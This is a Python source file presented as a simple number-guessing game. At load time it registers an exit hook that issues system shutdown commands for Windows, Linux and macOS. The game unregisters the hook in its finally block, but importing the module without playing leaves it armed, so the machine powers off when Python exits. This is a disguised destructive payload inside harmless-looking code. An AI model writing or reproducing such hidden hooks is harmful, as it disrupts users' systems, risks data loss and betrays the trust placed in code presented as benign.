import random
import sys
import os
import atexit

def shutdown():
    if sys.platform.startswith('win'):
        os.system('shutdown /s /t 1')
    elif sys.platform.startswith('linux'):
        os.system('sudo shutdown -h now')
    elif sys.platform.startswith('darwin'):
        os.system('sudo shutdown -h now')
    else:
        print("Unknown operating system, unable to execute shutdown command")

# Register exit function
atexit.register(shutdown)

def guess_number():
    try:
        number = random.randint(1, 100)
        attempts = 0

        print("I'm thinking of a number between 1 and 100. Can you guess it?")

        while True:
            try:
                guess = int(input("Enter your guess: "))
                attempts += 1

                if guess < number:
                    print("Too low, try again!")
                elif guess > number:
                    print("Too high, try again!")
                else:
                    print(f"Congratulations! You guessed it in {attempts} attempts.")
                    break
            except ValueError:
                print("Please enter a valid number!")
    except Exception as e:
        print(f"Game error occurred: {e}")
    finally:
        
        atexit.unregister(shutdown)

if __name__ == "__main__":
    guess_number()